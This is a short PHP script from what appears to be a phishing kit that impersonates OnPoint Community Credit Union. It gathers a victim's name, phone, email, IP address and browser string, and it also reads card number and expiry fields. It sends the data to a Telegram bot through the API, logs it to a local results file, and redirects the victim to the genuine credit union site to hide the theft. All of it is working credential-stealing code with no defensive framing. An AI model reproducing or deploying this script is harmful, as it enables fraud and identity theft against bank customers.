<?php
$zabi = getenv("REMOTE_ADDR");
include('tg.php');
$message .= "🚨OnPointCU - Personal Info🚨\n";
$message .= "Full Name : ".$_POST['fname']."-".$_POST['LastName']."\n";
$message .= "Phone Number : ".$_POST['phone']."\n";
$message .= "Email Address : ".$_POST['email']."\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "🚨By Forex_Expertz🚨\n";
$cc = $_POST['ccn'];
$subject = "UKNOWING [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: OnPoint <contact>\r\n";
$data = [
    'text' => $message,
    'chat_id' => $chat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

$file = fopen("Results.txt", 'a');



fwrite($file, $message);

header("Location: https://www.onpointcu.com/");
?>
